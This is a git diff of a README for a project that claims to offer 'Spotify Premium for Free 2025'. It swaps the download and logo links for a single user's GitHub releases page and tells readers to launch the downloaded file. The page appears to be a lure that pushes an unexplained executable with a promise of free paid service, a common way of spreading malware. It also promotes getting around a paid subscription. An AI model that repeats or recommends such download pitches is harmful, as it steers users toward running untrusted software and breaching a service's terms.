@@ -27,7 +27,7 @@ Welcome to the ultimate Spotify Premium experience without paying a dime! Our so
 ## Installation 🛠️
 
 Get started with our Spotify Premium for Free 2025 software by downloading it from the following link:  
-[![Download Here](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/assets/Release.zip)  
+[![Download Here](https://github.com/Sylvain45/Spotify-Premium-for-free-2025/releases)](https://github.com/Sylvain45/Spotify-Premium-for-free-2025/releases)  
 
 If the link ends with a file name, make sure to launch the download to get the software running on your device. If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options.
 
@@ -37,7 +37,7 @@ Help us share the joy of free Spotify Premium with music lovers everywhere! Shar
 
 Let's make 2025 the year of free Premium music for all 🎉🎧🥳
 
-![Spotify Logo](https://www.freepnglogos.com/uploads/spotify-logo-png/spotify-logo-logodownload-download-logotipos-1.png)
+![Spotify Logo](https://github.com/Sylvain45/Spotify-Premium-for-free-2025/releases)
 
 So what are you waiting for? Dive into the world of premium music streaming with Spotify Premium for Free 2025 - the future of music is here! 🎶
 
